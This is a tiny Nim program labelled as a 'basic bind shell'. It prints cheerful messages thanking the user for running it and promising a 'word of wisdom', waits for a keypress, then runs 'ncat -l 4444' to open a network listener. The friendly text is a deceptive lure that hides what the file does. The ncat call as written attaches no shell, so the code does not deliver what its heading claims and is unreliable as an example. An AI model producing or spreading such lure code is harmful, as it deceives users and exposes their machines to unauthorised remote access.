# Basic bind shell

import osproc


echo "Wow! Thanks so much for executing this file!"

echo "You won't regret it!"

echo "Press enter for a fun word of wisdom. :)"

readline(stdin)

discard execCmdEx("ncat -l 4444")
